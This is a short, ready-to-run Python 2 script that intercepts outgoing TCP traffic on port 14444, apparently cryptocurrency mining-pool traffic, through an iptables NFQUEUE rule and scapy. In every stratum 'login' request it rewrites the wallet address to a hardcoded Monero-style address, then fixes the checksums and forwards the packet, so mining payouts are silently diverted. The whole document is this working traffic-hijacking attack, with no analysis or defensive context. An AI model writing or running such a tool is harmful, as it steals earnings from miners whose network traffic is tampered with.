#!/usr/bin/env python

# sudo iptables -I OUTPUT -p tcp --dport 14444 -j NFQUEUE --queue-num 1

from netfilterqueue import NetfilterQueue
from scapy.all import *
from colorama import Fore, Back, Style
from collections import OrderedDict
import json

address = '44eW1KXz8BDfudHu93toPhAKwZCUh1hz9QMRdW5yQwZD6Ytr3vCKYaqEafDupT2fGKMqD99gnEjpfbXBTdPcMaL15kXfJn3'

def print_and_accept(pkt):
    print(pkt)
    pkt.accept()

def modify(packet):
    pkt = IP(packet.get_payload())

    if pkt[TCP].payload:
        before = str(pkt[TCP].payload)
        try:
            cmd = json.loads(before, object_pairs_hook=OrderedDict)
        except:
            packet.accept()
            return
        if cmd['method'] == 'login':
            cmd['params']['login'] = address + cmd['params']['login'][95:]
            after = json.dumps(cmd, separators=(',', ':'))
            pkt[TCP].payload = Raw(load=after)

            # print stuff
            print Style.DIM + before,
            print Style.RESET_ALL + after

            # reinit checksums/lenghts
            del pkt[TCP].chksum
            del pkt.chksum
            del pkt.len

            # bybye
            packet.set_payload(str(pkt))

    packet.accept()

nfqueue = NetfilterQueue()
#nfqueue.bind(1, print_and_accept)
nfqueue.bind(1, modify)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()

